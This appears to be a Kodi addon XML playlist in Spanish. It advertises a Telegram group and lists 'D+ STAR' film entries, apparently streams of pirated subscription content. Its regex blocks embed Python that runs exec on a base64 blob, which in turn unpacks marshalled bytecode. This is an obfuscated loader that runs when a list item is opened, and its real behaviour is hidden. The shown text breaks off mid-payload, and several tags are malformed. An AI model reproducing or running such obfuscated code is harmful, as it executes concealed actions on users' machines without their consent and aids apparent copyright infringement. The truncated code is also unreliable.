<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<item>
<title>[B][COLOR yellow]Grupo Telegram[COLOR white] @addonfestaycristal[/COLOR][/B]</title>
<link>NOLINK</link>
<thumbnail>https://i.imgur.com/TfN094h.jpg<thumbnail>
<fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
 <title>[COLOR gold]D+ STAR [COLOR white]Lo Nuevo de la semana[/COLOR]</title>
 <link>http://ignorame</link>
 <thumbnail>https://i.imgur.com/RBMAO5H.jpg<thumbnail>
 <fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 <externallink></externallink>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
 <title>[COLOR gold]D+ STAR [COLOR white]Cine[/COLOR]</title>
 <link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHl4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVtc3lXWHBqTVUxNldYcE5SRmsxVFhwSmVrNVVWVFJPZWswd1RYcEthVTVVUlhwUFJGSm9UWHBOTUU5VVdURk9lazB6VG5wWk5VMTZRWHBOUkZKdFRrUlZNazlVU21sT1ZFbDZUVVJSZVU1VVp6Qk5WRTB5VGtSbk1sbHFVVEpPUkVreFRXcFJNRTVIVVRKT2Vsa3dUbGRGTUZsVVdtcE9SRlV6VG1wU2EwNXRXWHBQUkdONlRtcHJNMDlFVVRWT2JVMTZUVVJhYTA1VVl6RlpWR016VFhwck1rNXFXVEpPZWxFeFQxUlJOVTF0U1ROTlJHTXpUbGRGTWsxNlVteE9WRUV6VFZSWk5FNUVaek5PZW1NMVRrZEZNVmxVVVRCT1JFa3lUMVJSTUUxNlNUTk9hbU15VFhwSk1GbDZVVE5OZWtsNVdtcFJlVTF0U1hsYWFsRTBUbXBGZWs1NldtcE5lbU15VG1wak1rNXFaM2xaYWsxNVRYcG5NMDVxWXpOTmVsbDVXV3BLYlUxdFdUQmFSRmt3VG5wWk1VOUVZekZPYWtsNVdtcEthVTU2VFROT1ZHTXlUbnBaZWs1VVpHaE9la1Y2VGxSak1rNXFTWGxaYWswMFRtcFJNMDVxVW1wTmJWa3pUbFJLYVU1RVp6SlBSRTAxVG0xTk1rNXFXVEpPZWxVd1dtcFJOVTE2WnpOT1ZFcHBUVzFaZVZwcVdtcE9SMDB5VG1wTmVrNTZRVE5PVkUxNlRucGplVnBxVFhwT2Vsa3pUbXBLYlUxNlRYcE5WR013VFhwcmVWcHFXbXBPZWswd1dYcGpOVTE2WjNwTlZGSnRUbnBaTVUxRVl6Tk9iVlY2VDBSTk1rNVVUVE5aVkVwcFRtcE5NRnBxU20xT1JHTXpUa1JhYVU1dFVYcE9hbU0wVGxSUk1VNUVZM2RPYlVWNlRsUlplazVVU1RCYVZFMDBUVzFaTUZscVRUUk5iVmt3VFhwak5VNTZXWHBQUkZVd1RrUmpNMDVxWXpKT2Fra3dUMFJSTlU1cVRUSlBWRlYzVFhwWk1VOVVTbTFPYlZVelRucE5NRTV0VFhwUFZGSnRUVzFKTUZscVl6Uk9hbFV6VFdwU2JVNVVUVEZOZWsxNVRXMUpNMDFxWXpKT2FsVXdXV3BOTlUxNlZUTk9lbGt5VGxSQk1rMTZZekZPYlVVeFRXcE5NRTE2VlhsWmFsVjNUa1JaTUU1RVkzbE9lbFY2VDFSS2JVMTZTVEZOZWxVelRtcGplazFVV21oT1JHc3hUVVJOZDA1NlFUTk5hbHBzVGxSTk1VNXFZekpOZWxsNVdtcFJNazU2VFROTmFrMHhUWHBKTTA1RVl6Sk9hazE2VGxSak5VMXRXVEJPZWsxM1RYcGpNRnBVV1hwT2FrVjZUV3BqZUU1NldUQlphazB4VG5wak1sbDZZekpPZWtreVRWUmFhMDU2VlROTmFsVXpUbnBSTTAxcVVtbE9SRTB4VG5wamVrMTZSVEJOZW1ONFRsUkJNRTlVV21sT2FtTXpUV3BWTkUxNlVYcE9lbU40VGtkSk0wMXFWVFJPVkdNd1dsUlpNRTE2VlROWlZGVTFUbnBuTUU5RVdUQk9iVVY2VGtSS2FVNVVVVE5aVkZrd1RtcFZNVTlVV1hoT1ZFa3lUVlJWTkUxNldUTk9SRlY2VGtkWk1FOUVZekpPUkUweVdtcGpNVTVxUlROWlZFcHBUWHBKZWs5RVdtdE9la0V6VFdwamVVNXRWWHBOYWxFeVRYcFZlazlFWTNsT1JGVXdUbnBqZWs1VWF6SmFSRlY2VFhwbmVrNTZZM2xPVkdNelRVUmFhMDU2UlRCWmFtTjZUbXBaZWsxVVVtbE9SMDB3VFdwU2JVNVVRVEJPYW1NeVRsUm5NMDE2V1hoT1JGVjZUa1JhYkUxNlVUQmFhbU0wVFhwUmVrMTZWbWhPVkdzd1dtcE5ORTU2U1RKT1ZGWm9Ua1JaTTAxNlVUQk5lbWN5V2tSUk1FNXFUVEpPUkZwcVRucG5NbHBVVlhsTmVrMHpUbXBhYUU1dFRUQlBWRkpyVG1wRk0xbFVUWGRPUjFVeFRXcGFhazVVUlRGTlJGcHJUa1JuTWs1cVVUUk9hazB4VG1wU2FVNUhWVE5OYW1ONVRrUk5NMDVVVVRKTmJVa3pUbnBTYWs1NldURlBWR041VFhwTk0wMTZVVEJPUkdjeVdrUktiVTU2V1hwT2FrMTVUbnBKTWxscVl6Rk9lbFY2VDBSamVVNVVZek5OZWxVMFRtcE5NbHBxVlRCTmVrVjZUV3BqTUUxdFNUQmFhbGw0VG0xTk1VNUVWWGhPZW1kNlQwUlZNazE2V1ROTlJGVTFUWHBOZWs1NldtdE9SRkY2VDBSTk5FNTZTVEZaVkUxNVRtMUZNazlFV1RKT2Vsa3lXVlJOZVU1NlRUSlplbEUwVFhwWk1rNTZUWGhPYWxFelRYcFJNVTE2VlhwT1JGVXhUbnBGTUZwRVRYZE5lbXN5VG1wU2EwNUhTWHBPYWsxNVRucFZlazlVV21wT1YwVXhUbXBhYkUxNlZURk5hbU0wVFhwSk1GcEVZekpPUkdzd1drUkthVTV0VVRGT1ZGRjZUbXBKZVZwcVVUSk5iVWt3VGtSYWJFNXRVVEZOZWxFelRtMVZNVTlVWXpOTmVrVjZUVlJhYWs1NlFUTk5hbEUwVFhwQk1VOUVUVFZPZWxFeldWUlNiVTU2VlRCTlZFMHpUbXBWTTA5RVNtMU9SMVV6VDFSYWJFNUVZek5QVkZVMVRrUmplazlVVVhoT1IwVXdXbFJqZUU1VVFUQmFSRTE1VG5wbk1scFVZM3BPUkVVeVRrUk5lVTVxWnpGT2FrMTZUbFJqTUU1NldUSk9SMDB4VFdwTmVrNTZhekpPYWxVMFRucG5NVTVFVW10T1JHTjVXV3BqZWs1RVdURk5SRnBxVG0xUk1sbDZXVFJPYlZVelRVUmpNRTVxV1RCWlZGSnBUa1JGZVZwcVRYaE9lbU15V1ZSak0wNXRSWGxhYWxFeVRrZFpNVTVxVFhoT1JFVXdXbFJOZVU1RVRUSk5hbHBwVG5wVmVrNTZVbWhPUkVrd1RrUktiVTU2YTNwTmVsRXpUWHBCZWs1VVdUQk9ha2t3V1dwTk1rNXFUWGxaYWsxNVRsUkpNVmxVWXpWT1JGa3hUV3BWTkU1VVl6QmFSRkY0VG0xWk1FOUVUVFZPZWsweFRsUmthRTE2U1RCT2VtTXhUa1JWZWsxNlNtMU9SRVV5VFhwTk5VNTZSVEpaZWxwb1RYcFpNRTFVVFhsTmJWa3pUbnBqTVUxNmF6Sk5WRnBzVG0xSk0xbFVXVFJPUjFreVRsUlZlRTVxV1hwT1JFMHhUa1JuZWs1cVkzbE9hbXQ2VFhwTk1FNXRTVEpPYW1ONVRYcGpNazE2WTNsT1IwVXhUVVJqTkU1NldUQlBSRkpvVGtSSk1VNTZZekJPYlVVeFRVUlJNRTU2WTNwUFJGRjZUbnBOTWs5VVl6Rk9lbFV5V2xSVk1VNXRVVEJQVkZVeVRtcFpNVmxVWTNsT2Fra3hUbnBTYlU1RVRUTk5hbEpxVGtSWk0wNUVVVEJPUjFsNVdXcFJORTR5UlRCT2FsVTBUbXBKTWxscVRURk9lbXQ2VFVSWmVVMTZZekpaZW1ONFRrZFpNazVVWXpKTmVsa3dUMFJaTWs1SFdUTlBWRkpxVGxSWk1GbHFaR2hPYlZGNlRVUlZNazVVVVRKYVZGRTFUbXBuTTA1cVl6Sk9SRVV5VFhwak1rNXRXVEpPYW1NeFRXMUpNbGxVVFhkT1ZHZDZUMVJqTVU1RVozcFBSRkp0VG1wUmVrNXFVbXBPUjBWNlRucGFiRTVFWXpCWmVsa3hUbnBqTVUxRVdUSk5la2t4VDBSUk1rNUVZM2xaYW1NMVRrUk5NRnBVVm1oT1IwVXlUVlJOZUU1cVNUQk5WR041VFhwbk1FMVVXbXROYlZrelRucFJNMDVxU1RKWmVsRXdUa2RaZVZscVVtdE9lbWN3VFZSYWFrNTZaek5OZWsweVRYcFpNRmxxVFhkTmVrMHpUVlJWTVU1cVp6Tk5hbGw0VG0xRk0wNXFUVE5PVkZVeFRWUlJORTR5UlhwTlZFMDBUbnBqTVU5RVdtcE9SR042VG1wWk0wNXFVWHBPZWsxNVRucEpNVTFVV21oTmVrMHlUbnBSTkU1dFVUSlBWRmt5VFhwbk1scFVUVEJPUkZVeFQxUlZlazE2VFhwUFJGRjZUa1JaZWs1VVVUUk9Na1V6VG5wWmVFNVVZM3BPVkdNd1RrUm5NRTlVWXpWT1JHZDZUWHBWTWs1VVNUQk9lbU14VGxSWmVrMTZWVFZPYW1zeFRrUlpORTR5UlRKT2VsVTFUVzFKTTA1RVRYaE9iVTB6VGtSUmVVNXFTVEphYWsxNVRucEpNbGxxVlRST1IwMHlXWHBqTkU1RVJUQlBSRnBwVG1wbk0wMTZZek5PVjBWNlRrUmpOVTVIUlRKYVZGVTBUa2RaTUU1VVRUTk9hazB3VG1wUk1FNXRUVEZOUkZreVRucG5NRmxxVlRST1ZGVXpXVlJaZUU1NlVUSk5WRkY2VFhwbk1rOVVVVEpPYlZVeFQxUlJlRTVVWnpCT2FtTTBUbXBuTUZsVVRUSk9WRVV6VGtSTmVrNUhSVEpQUkZreVRYcEpNRTFVVlhsT2FrMHhUMVJTYkUxNlZURlpWRTB6VGtSTk1VOUVVWGxPYWtreldWUk5lVTE2UVRCYVZHTjZUbTFKTTAxcVl6Sk9SRVV5VGxSWk1rNVVWVE5PUkUwelRrUkZNbGxVV1RKT1JFVXdUa1JWZDAxNll6Sk9lbEpxVFhwbk1rOUVVbXBOZWtsNVdtcFJNVTF0U1hwT1JHTXpUWHBaZVZscVVYaE9SRTB4V1ZSTmQwMXRXVEJPVkZFelRYcEpNbGxVVlRWT1IxRjZUa1JqTTA1RVl6Sk9SRkp0VFcxSmVrMXFXWGxPUkdjelQxUlZlVTE2VVRGWlZFMHpUa1JaTTA1cVdtcE9hbXN3VGtSak1rNXFSVEphYWxFeFRrUkZlazlFVFRGT2VrMHhUV3BSTkU1VVVYcE5la3BwVG5wQmVrNTZVbTFPYlZFd1dsUmpNVTVIVlRCT1JGVjNUa2RSZWs5VVkzZE9WRmt3VDFSVmVVMTZWVEpaVkdNMFRrUlJNVTU2WXpGT1IwMHlUbXBqZUU1RVdYcFBSRlpvVG0xSk1sbFVXbXhPYlZrelRrUlplRTVVUVROUFJFMDBUbFJKTUU1cVRUUk9SRVV4VDBSS2JVNUhVVEpPZWswd1RucE5lazU2VlhsTmVtc3lUbnBaZUU1cVZUSk5lbFV6VGtkSmVrMVVZM2RPVkVsNVdtcFpNMDVVVlhwT1JFcHBUa1JKTWs1cVpHaE9SR2Q1V1dwTmQwMTZaek5QVkdSb1RsUmpNazE2VlRWT1JFVjZUbFJWTlU1VVFUSk5lbHBvVG1wTk1VMVVWWHBOYlZreFQxUlZNazE2WXpKYVJGcHNUWHBSTTAxVVNtbE5lbFV5V2xSYWFFNXRTVEJPUkZVelRYcEplVnBxV20xTmVsbDZUWHBOZUUxNmF6Rk5hbHBwVGxSbk1VNTZVVEpPYWxrd1QwUlNhazVxV1ROWlZGcHBUbFJOZWs1RVl6Tk9iVVV5VG1wYWFrMTZUVEpOVkZGNlRtcFpNRTlVWXpOT2Vra3lXa1JWZDA1NlJUQk9SRmw1VG5wak0wMXFZelZPYlVreVdrUktiVTVFYXpKUFZFMHdUbTFaTTAxRVRUTk9ha2t3V1hwamVFNUVaekJQUkdONlRrZFJlazVxVFRKT1ZFVXpUVVJqTlU1NlNUQk9lbEY0VFcxSk0xbFVXbWxPYWtWNlRucE5kMDV0VlROWlZGRXlUbFJWZWs1VVRURk9iVVV5V2xSUk1FNVVVWHBPUkZrMFRucFplazVVWTNsT2FrMHdXa1JaZWs1cVJURk5SRnBvVG0xTk1rNXFUVEJPUkZVeVRXcGpkMDE2VFROT2FtTjZUa2RSTTA1cVZUTk9lbU14VFVSVk1VNUVSVEJQUkdNMFRtMVplazVVVFROT1ZHc3dXV3BOTkU1dFNYcE5lbEpyVG1wVk0wMXFVVFZOZWsxNlRYcFNhMDVFV1hwUFJGSnJUbXBWZWsxcVRUUk9WRWt6VFVSak5VMTZZM3BQUkdNeFRucG5lazFVVFhoTmJWa3dUbXBWTkU1RVJUQlplbFUwVFhwRk1FMTZZekZPVjBVelRucGthRTE2WXpCT1ZGSnNUVzFaTUZscVl6Rk9WRVV3VGtSak5FNUhWVEphUkZwdFRYcGpNazVFVW10T2VtY3hUV3BOTkU1RVNUSk9hbEpzVG1wVk1VMTZUWGRPZWxFeVRXcE5kMDVYUlRGT2FrMDBUWHBaTVU1NlNtbE9hbEV5VG1wUk5VNXFSVEpOZWtwcFRtcFJNazlVVFhwT1ZHTjZUWHBWTkU1RVJUSk9SRTB4VGxSVk0wNVVXWHBOZWswelQwUlNhazVxVlRCYWFsVjNUWHBOTTA1NlZYcE9WRkY2VFdwamVVNUhTVE5QUkVwdFRtcHJNazVVVVRGTmVtTjVXV3BWTWs1SFZUQk9SRlV4VGxSak1FNTZWVFZPZWxFeVdWUlpOVTVVWnpOUFZGRXhUWHByTTA5RVdUVk5iVmt6VDFSU2FrNTZXVEJOVkUxNVRsUlpNbHBVV214T2JVa3pXVlJSTkUxNlp6SlBWRmt6VFcxWmVrNUVXVEJPVkdzeFRYcE5OVTVVU1hsYWFtTjNUa1JaZWs1RVRUSk9ha1V5VDFSUk5FMXRXVEJhVkZWNVRYcFZlazFxV1RKT2JWa3hUV3BLYlU1Nlp6Tk5lbU4zVFhwTk0wNTZVWGhPZWxVeFQwUlNhazVxYXpOT2FrMHlUbGRGTWs1VVl6Uk9WRUV3V21wVmVVMXRTVEZOVkZab1RYcFpNMDlFV1hwT1ZFVXlXWHBaTWs1SFVURk9hazAwVG5wRmVWbHFXWGxPVkVWNlRVUmpOVTVFUlhwTmFsVTFUbFJGZVZwcVVtdE9WRkY2VG5wYWFrNXRXVEZQVkVwcFRrUlJNazFxVm1oTmVrVXpXVlJqTlU1NlZYcE9SRkY0VFhwck1scEVWVFZOYlVreFRXcEtiVTE2WXpGT2Vsa3hUakpGTUU1RVl6Sk9SMUY2VFZSTk1FNTZaekZPUkdNMFRtMVpNRTlFVW0xT2FrVXpXVlJWZDA1dFdUQk9SRlY1VFhwbk1scFVXbXBPYWsxNlRsUmplVTU2WXpCTmFsVXdUbnBuTWs5VVdUSk9hbXN3VG5wVmQwNVVXWHBOZWxsNFRtcE5NazE2VlRWTmVtY3pUV3BLYlU1SFdUTlBWR1JvVFhwamVrMUVVVEJOZW1zelRtcFNhMDE2VlRGTmFtTXlUbnBOTUZsNlVtMU9SRlV3VFdwamVrNVVSVEphVkUweVRsUlpNMDlFV1RKT1IxbDZUVlJrYUU1cWEzbGFhbEpyVG0xVk1VNTZXVEJPYW1Nd1RWUlplVTVxWXpKT2VsSnFUbTFKTWs1cVdtdE9SRkV5VGxSU2FVNUhXVEJhVkdONlRtMVplazVVWTNsTmVrRjZUWHBaZWs1VWF6Tk9hbU0wVGtkUmVrNTZUWHBOYlZreFRsUmFiRTF0V1RKUFJHUm9UbnBGTUU1VVRUUk9SMUV6VGxSWmVVNXRSVE5PYWxKclRrZFplazlFWXpWT2JWVjZUbnBaTlU1VVZYcFBSRTB5VG5wbk0xbFVVbXhPZWxsNlRYcGFiVTU2VlRCYVJGVjRUbFJuTTA5RVkzZE5lbGt3V1ZSWmVVMXRXVE5PUkdONVRtcFpNMWxVVW10T2JWRXlUbXBqTlU1SFRUTk9WR040VG0xRk1VMUVZelZPVkUwd1drUmthRTE2WnpKUFZFcHRUbXByTUUxNldUSk9Na1V3V1dwWk1FMTZhM3BOZWxwclRtcFpNMDVVVVRWT1IxRXlUWHBqTlU1RVJUSk5lbFpvVFcxWk1FNUVVbXRPVkUxNVdtcE5kMDVVV1RCYVZFcHRUWHBKTWs5VVRUVk9iVWt4VFhwTk5VNTZhM3BPVkZwcVRtcEpNVTlVVVROTmJWa3dUMFJSTTA1SFdUQk9SRmw0VG5wak1FOUVUVFZPVkZFd1drUmpNRTVVVVROTmFsa3lUWHBGTUZwRVpHaE9ha2t6V1ZSU2EwMTZRVEJOZWxKdFRsUnJNazFxU21sT1ZFRXdXbFJTYTA1NldYcFBSRkY1VG5wVmVrOUVZek5PZWxreVdXcGFiRTU2VlhwTmVsRXlUVzFaTUUxcVVUSk5lbGt4VGtSTk1rNVVVWHBOZWxKcFRtcG5NMWxVWXpST1ZFVXdXa1JSZWsxNlp6SlBSRlUwVFhwSk1VMUVXVEpOZWxVelRXcE5NRTE2WnpKTlZGcHNUbnBOZWs1cVRYaE9SR3N5VG1wTk0wNHlSWHBQVkZwc1RsUkZlVmxxVFRST2VsVjZUVVJOZWs1Nlp6SlplbGt5VG1wTk1VNTZWVEpPVkUweldWUk5NMDVVWTNwTmFsRjZUVzFKTUZscVdUQk5iVWt6VDBSVmVVNTZUVEphVkZKdFRucFJlazlVVVRCT2Vsa3pUWHBSZVU1cVNUQlphbFY1VFhwQk1VMUVZM3BPUkdkNlRtcFNiRTVxVlRCYVJGVjVUWHBuTTA1cVdteE9lbFV3V1ZSUmVVNXFXVE5aVkUwelRsUnJNbGxVVFhoT2Ftc3hUbnBaTWs1dFVURk5hbU14VGtSTk1scEVZelZPUjBreVRXcE5OVTV0VVRKYVZFMHhUa1JOZVZwcVkzZE9iVlV6VDFSU2EwNVVRVEJaYWxrelRYcEJNMDFxV1RST2JVMHlUbXBhYlU1RVRYcFBWRmt6VGxSck1rNVVUVFJOZWtFelRtcFNhMDVFVFROT2FrMDBUbFJOTVUxRVdYaE5la0Y2VG5wTk0wNUhWVEpPYW1NMFRsUkpNRTVVVlRGT2Vsa3dUMVJhYkUxNlp6Tk9lbEUwVG0xRk1FOVVVVEZPUjFFeVRYcFplazVVYTNwT1JGRjRUa2RGZWs1cVRUQk9ha2w2VFhwUmVFNVVRVEpQUkZFeVRYcEpNRTFxWTNoT2VtY3lXVlJOZUU1NmF6QlpWRkV5VFhwVk1rMTZWVEZPYWtWNlRucGplVTVIUlRKWmVsVTBUa2RSZVZwcVkzaE9SMDB3V21wUk1FNTZWVE5aVkZsNVRtMUZNRTlFV20xT1JHY3pUMFJOZUUxNlRURk9WR00wVFhwak0wMTZUVFZPUjAxNlRtcFZOVTE2V1RGT1JFMTZUbXBKTTAxRVVteE5la2t4VG1wTmVrNXRWVEpPUkZrMFRucFJlazVFWTNkTmVsVXlXa1JhYkU1cVNUQlphbGw1VG1wUk0wMVVWVEpPZWxVeFRtcGpORTVVV1ROWlZGSm9UbXBaZWsxRVZYcE5lbGt5V2xSamVVNUVWVEJaVkUxNFRsUkJNazFVVlRCT1ZFRXlUMVJaTkU1RVp6SlBSRnByVG5wWk1FOVVUVE5PVkdzd1RrUk5lVTV0VFROT2FrMHpUbFJOTWsxNlVUSk9hbGt3VG5wUk0wNXFXVE5OVkZsNVRtMUZkTXNWQUFCc1RYZGFNa0YzUkRKTmQwVjFRWGRJTVZwM1JESmFiVWd4UVhkRmVVRnRTREZDVVZvMFFVZElNMEZ0V2pGQlVYZ3dRVkZNTWtGNlNEQkNSMFF3UVhkU00xcFJSREJhZWt3eVdrZEVNVUZSUkRGQ1VWcHRRVkZFTUUxM2NHdEJkMGd3VEhkRU0wRkhUR3hOZDFwc1FVZE1iRTEzV210QlVVZ3hXbEZ4ZFVGUlVqSkJkMDE0V20xME1WcEhTRFJhYlhneFRFZHdNa0Z0VWpCTlVVVjZRVWRXTVVGM2NESkJkMXB0UWtkTmVrRjNURzFDVVhBMVducFdiVUZIY0cxQlIzUnRXa2RFTWtGNlVqSkNVVXd6V20xYU1rRnRTRzFhZWxZeVRVZEpkVUZVVW0xYVIwUXlRVEpTYlVGM1JYVkJiWGd6UWxGeGRVRnRkREZhUjBoc1FXMWFNa0pIV20xQmJWb3lXbTF3TWxwNlRESmFkMGd4UVhkRU1FeDNTR3RCZDB3elRFZEVNMEYzVERCTWQxZDZXbTFhTWt4dFJYcEJTbEl3UVhkWGRrRlJUREJDVVhBMVFYcGFNRUpIY0RSQlVYUnRRbEZFYTBGM1NETkNVVVYyUVVkTU1VRlJTREJCYlV3eVRIZHdNa0ZSU0cxQmQwdzFRWGRNTTFwSFJYcEJkMFJ0UVVkYU5FRjZVak5CVVhCdFFYZDRNRXh0VERSQmVsSXdRVkZJTTBGSFZteE1kM0EwUVVkV01WcFJUWFpCU2xKdFdrZGFiRUYzZERCTWJVVjFXbTFPTVVKUldqSkJSMW95UVVkRU5GcHRlRE5hUjBReVdtMTBNa3hIUkd0QmJVd3dRVWR3TUVGM1dtMUJiVVF3UVVkMGJFMTNjREJCZDNneldsRkpkVUYzZEROQmQzQnNRVWRhTWsxUlNHcEJVVXd6UWxGTU1rRkhjREZhZDFwdFFYcE1Na0YzU0RWQmJYUXpRVzFJYkVGVVdtMUJiVWhyV20xd2JVRjNUWFZCYlU0eVFWRmFiVnB0ZURCQ1VVd3lXbTFhTUVGUlRESkJVWEJ0UVVkRU5WcHRVbTFhUjBRd1FYcEVNVnBIVEcxQlIzQXdRa2RhTlVGM2VHeE5kM0YxUVcxTU0xcDNTREJhYlhneVdrZEliVUZ0UkRKQmQzRjFRVkZhTUUxSFRERkJkMFF5VFVkWGVrRjNXakZCVVZveVFWUmFNVnB0U1hWQmJVZ3lUWGRFYlZwdGVETk1SMFY1UVVkT01FMUhSWHBCYlZJeVFYZEZlbHB0U0cxYWJYQXdXbnBXTTB4SFRYWkJla2d4UWtkd05FRnRUREpNUjBRd1FWRjBNa0YzUkd0QmQxb3lXbTF3TkVGM1dqTkJiVXd5UVcxME1FSlJSRE5CYlV3eVFrZEViRUYzVERCQmJVMTFXbTE0YlVGM1NHcEJVVXd4V2xGRmVFRlVSRzFCUjAxMlFWRldiRXgzY0d4YWJVd3dRVzF4ZFVGdGNHMWFiWEJzUVhwTWJFeDNSWFZCUjBodFdtMUlORUYzV2pKYVIwaHNRWHBTTWsxUlNHcEJiVWh0UVhkTWJVRlJXakphZDNGMVFYZFdNa0pIVERSQmVrZ3lURzFGZUZwdGVETkJVVVF6UVVkTWJVSkhXbXhhZWxZeldtMWFNa0ZSVERGYVVWb3pRVWRhYlVKSFRHdEJWRXh0V25kTmVscHRUREZCVVZvMFFYZDRNRUZ0Y0RKQlIzQXlUVkZYZWtGUlJETk1SMDEzUVZGRWJVSkhXak5hYlVReVRVZGFNVUZSUkRKQlIweHNRVkZTYlZwdFRHeEJWRm95UWtkSWFrRjZVak5CVVhBMVdtMWFNazFSUlhwQmQwaHRXbmRhYWxwdGVHMUJSMHhyUVZSRU1VeEhUREpCUjBRd1RHMWFOVUZ0Y0ROQmQwZ3pRVkZXTWxwdGNEVkJSMFF6VEVkRU5WcDZURE5hYlVRd1dtMUlNa3h0VjNwQlIxSXlRVkZNYkZwNlRERmFVVm96UVcxV01FeHRjRFJhZWt3elFYZHdhbHA2VmpOQmQzQnFRVWQ0YkV4M1JHeEJSMVl5VFhkYWEwRlVUREJCVVZvMFFWRmFNRTFIY0d4YWJVd3hXa2RNTVVGNlJETkNSMFYxV20xSU0xcEhUREpCVkZKdFFVZEVNbHB0Y0RCQmQwdzFRWGQ0TUV4M2NEVkJla3d4V25kSWJGcHRWakphZDBoc1FWRldNVXhIVEd4QmJYQXhXbEZhTWtGdGVESk5kMHh0V25wV01scEhURFZCVVZwc1RIZHdha0Y2V2pGQ1VVUXlRVEpTTTBGdFRHdEJSMGd4V25kWGRrRjNjREpCUjNCdFFVZE9NRnBIV214QlZFZ3lUVkZFTlVGM2VHMUJVVVY0V20xYU1FeEhWM1pCVkZJeVFVZE5lRnB0VWpCQmJVd3lRWHBTTUUxUlNEUkJSM2h0UWxGRU5GcHRXakJCVVVnd1FWRkliVUYzY0dwQmVrUXdXbTFGZWtGdGVEQkNSMFYxUVZSYWJWcEhSRE5CVVhReVFVZHdNVUZ0VWpKTlVVUXlXbTFhYlZwM1JEQmFlbFl3V25kd01FRjNSREZDUjB3d1dtMUVNMEZ0UlhoQmJVd3lRa2R3TVVGdFdqTkNVVVJ0V20xd01rSkhTRFZCVVZveVdrZGFNbHB0V2pOYWJVVjNXbTFFTWtGSFdtdEJVVXhzVFhkRU0wRlJlREZDVVV3eVFYcEVNRnAzVERSQlIzUXdRa2R3TlVGM1RHMWFkMGd6UVZSV01rRjNSRE5CVkV3d1RWRk1ORUZSUkd4TWQwbDFRVzE0TUV4dFdqUkJWRWd5UVVkSWEwRlVVbTFDVVVWMldtMTRiVnB0VERWWGFqQlljVlZYWTI5NmVUQnlSazQ1VmxCeGVFRjNRVlJ4ZDAxbFRYbzVXbkpoUVVKd1NFRktjRkYwYVUweVFXeHVNbGRKUjIxSU1rMUpVMGhOUzBWalJIcHhaMjVLVjBwWU1FRnJSbmw1YWsxVWExQk5Ta1ZEV2pGTlpsb3hWMjF3ZVhobFRIcG5RWEZTYW1wS1MwOVVRVkZKVUVjd1YxaHdTVUYxUm5sU05Vd3lUVTFCWVhsalNUTlNNa1F4UlVad1IxTlNURXBOZW5GNVRXSk5iVTkxV2pKTlVVRjROV3h3VVZkMlJVdEJXRVY0VFVKWmJYRk1TRWxKUjFwaFFVTnVVbkZIY0RGaldVa3pVakZhU1hWdVJXMXhRbTlIZVVwQlUzbHFXRE41Ulc4emNXZEdiWGxqUlVwQlVVSkxUREZCZGpsR1IwaGpWM0ZWUVd0eWQzbDJiMHBuZGxwaFJXZEJTRWxGY0RKMVduSlNOR2xCZVVGV1IwaEpVMW96Y1cxQk1FMUVXVEZUV1ZwVVJWWkZiRGxCYm1GNWExb3pSVkp4TUhobGJrbEVNbTUyT1ROQllVUnBiM2xQZFVWdFJUQk5SamxoUjBkVFFrbExlV05FU0RWUmNIZzViRzlSVDNkWU1FVjRRVkZOZG5GUlRteHZNbU5IUVVkMVJVeEhkVlpFU25sVlNVaGpkMGQ0V2pKQlZYVlFjREo1UWtwS1REQnhNMGxaV1ROSmQwRjRjVzFHVTBGdFIxUkVNVXd6Y1ZseFZGZFZSM2h4WjBwSFNVZEdNWGt3V25oNU5YSlVkVU53TW5sNlNWRkpNVnBRWmpWSFVqaHRRVXBuV2tnelFXNUZNakExY2tnNWJHNTRkREJLU2tWSmNESk1Na2g1UVdWWU0zRm9XRE5GVVVSNk5UVk1TSFZwVFhkNWFrbFRUVVZ2TWpGWGJqRlBUVnBMWTNwSmVGZGhiakpuUmxrd1FXTmFNR3RTV2pJNWFFaEtNVE52VTBscWNUTlBVbHBHT1ZwYU0wUnBRVk5KWWtkSGRXNU1NMDlsY0ZOVGFuSjZaMjVOZWxJemNrcE5hSEZLWm1wdlUwNDBjREZhYTBkdGVEQkJkMEZDY1hkTmEwVXlVMEZIWVVGb1REQnJhbkJUVjIxdlUwUXhRVzFOUk